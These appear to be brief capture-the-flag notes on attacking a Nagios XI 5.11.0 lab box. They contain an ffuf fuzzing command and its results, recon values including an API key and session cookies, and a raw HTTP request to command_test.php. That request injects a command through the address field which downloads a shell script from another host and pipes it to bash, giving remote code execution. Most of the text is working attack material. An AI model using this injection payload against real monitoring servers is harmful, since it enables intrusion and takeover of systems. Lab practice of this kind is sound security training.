## Recon
API Key: 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK
Nagios XI Version: 5.11.0
Cookie: nagiosxi=3vk6s70i3j5upueug1hki81a0a

## NMAP /include/components
```bash
ffuf -u "https://nagios.monitored.htb/nagiosxi/includes/components/FUZZ" -w /usr/share/seclists/Disco  
very/Web-Content/directory-list-2.3-small.txt -r -b "nagiosxi=3vk6s70i3j5upueug1hki81a0a"

profile                 [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 62ms]  
map                     [Status: 200, Size: 24179, Words: 4803, Lines: 430, Duration: 105ms]  
proxy                   [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 64ms]  
favorites               [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 63ms]  
actions                 [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 62ms]  
response                [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 63ms]  
metrics                 [Status: 200, Size: 31069, Words: 5777, Lines: 549, Duration: 218ms]  
rename                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 74ms]  
msp                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 65ms]  
pnp                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 71ms]  
mtr                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 61ms]  
ccm                     [Status: 200, Size: 36, Words: 8, Lines: 1, Duration: 168ms]  
                       [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 73ms]  
rdp                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 63ms]  
duo                     [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 67ms]
```

## Command test
```
GET /nagiosxi/includes/components/ccm/command_test.php?cmd=test&token=300de1b8ae47ed0dd96a837937df8eff&mode=test&address=127.0.0.1||(wget%20http://192.168.1.170/a.sh|bash%20a.sh);%23&cid=12&arg1=20%25&arg2=10%25&arg3=%2F&arg4=&arg5=&arg6=&arg7=&arg8=&nsp=912a3da8396db75e6fc275f556a6f076b4c830a4c3ec4c17a16771b704ea8bbe HTTP/1.1
Host: 192.168.1.10
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: */*
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://192.168.1.10/nagiosxi/includes/components/ccm/?cmd=modify&type=service&id=2&page=1&returnUrl=index.php
Cookie: nagiosxi=4usi1041slmu9064dfqfo9c502
```